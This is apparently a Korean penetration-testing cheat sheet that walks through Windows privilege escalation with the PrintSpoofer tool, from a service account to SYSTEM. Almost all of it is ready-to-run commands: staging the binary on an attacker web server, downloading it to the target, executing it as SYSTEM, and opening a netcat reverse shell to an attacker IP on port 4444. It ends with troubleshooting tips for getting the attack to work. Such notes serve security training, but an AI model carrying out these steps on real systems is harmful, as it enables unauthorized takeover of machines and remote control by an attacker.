# PrintSpoofer — SeImpersonate 권한 상승

- PrintSpoofer — SeImpersonatePrivilege 보유 서비스 계정(IIS AppPool·Network Service·MSSQL 등)에서 SYSTEM으로 올라가는 도구. Windows Server 2012~2019에서 동작한다.
- 웹셸·MSSQL xp_cmdshell 같은 서비스 계정 셸에서 whoami /priv에 SeImpersonate가 보일 때, SeImpersonatePrivilege 문서 절차의 도구 단계로 실행한다.
- PrintSpoofer64.exe 바이너리(Kali windows-resources 패키지 또는 GitHub 릴리스), 타깃 쓰기 가능 경로(C:\Temp), 타깃에서 공격자 http.server 접근이 필요하다.

## 1. 바이너리 준비 (Kali)

```bash
# windows-resources 패키지에 포함된 버전
sudo apt update
sudo apt install -y windows-resources
ls /usr/share/windows-resources/binaries/ | grep -i printspoofer

# 패키지가 없으면 GitHub 릴리스 직접 다운로드
sudo wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer64.exe
```

- 전송할 디렉터리로 복사해둔다: `cp /usr/share/windows-resources/binaries/PrintSpoofer64.exe /tmp/`

## 2. 전송

```bash
# 공격자
cd /tmp && python3 -m http.server 80
```

```powershell
# 타깃
powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.58/PrintSpoofer64.exe' -OutFile 'C:\Temp\PrintSpoofer64.exe'"
```

- 웹셸을 통해 내리는 경우 URL 인코딩이 필요하다 → windows/powershell/invoke_webrequest.md

## 3. 실행 — SYSTEM 확인부터

```powershell
# 먼저 현재 계정·특권 확인
whoami
whoami /priv | findstr /i "SeImpersonate"

# 테스트 — SYSTEM인지 확인
C:\Temp\PrintSpoofer64.exe -i -c "whoami"
# 성공 출력: nt authority\system

# SYSTEM 셸 유지
C:\Temp\PrintSpoofer64.exe -i -c cmd

# 리버스 셸 (공격자 리스너: nc -lvnp 4444)
C:\Temp\PrintSpoofer64.exe -i -c "C:\Temp\nc.exe 192.168.45.227 4444 -e cmd"
```

- `-i`: 현재 콘솔에서 실행, `-c`: 실행할 명령. `-d`는 새 창(데스크톱 세션 필요)이라 RDP·콘솔 세션에서만 쓴다.

## 4. 옵션 정리

```text
-i   현재 콘솔에서 명령 실행 (웹셸·원격 셸에서 필수)
-c   실행할 명령 문자열
-d   새 창으로 실행 (콘솔/RDP 세션 전용)
-w   잠금 해제 후 실행 (워크스테이션)
```

## OS 버전별 도구 선택

```text
Server 2012 ~ 2019   -> PrintSpoofer (이 문서)
Server 2019+ / 최신  -> GodPotato (.NET 4 필요)
2008 / 구형          -> JuicyPotato (CLSID 필요)
도구 목록            -> active-directory/potatoes.md, windows/privileges/SeImpersonatePrivilege.md
```

## 트러블슈팅

- 실행이 바로 죽거나 아무 출력이 없으면 OS 버전이 지원 범위 밖이다. GodPotato·JuicyPotato로 전환한다.
- `-d` 옵션은 데스크톱 세션이 없는 웹셸 환경에서 실패한다. 웹셸·WinRM에서는 반드시 `-i`를 쓴다.
- `Access is denied`는 SeImpersonate가 실제로 없는 경우다. whoami /priv 출력에서 특권 목록을 다시 확인한다.
- nc.exe가 없으면 리버스 셸 대신 `-i -c cmd`로 대화형 SYSTEM 셸을 열고 명령을 직접 실행한다.
- 바이너리 전송 실패는 아웃바운드 문제가 대부분이다. http.server 포트를 80 → 8080으로 바꿔 재시도한다.
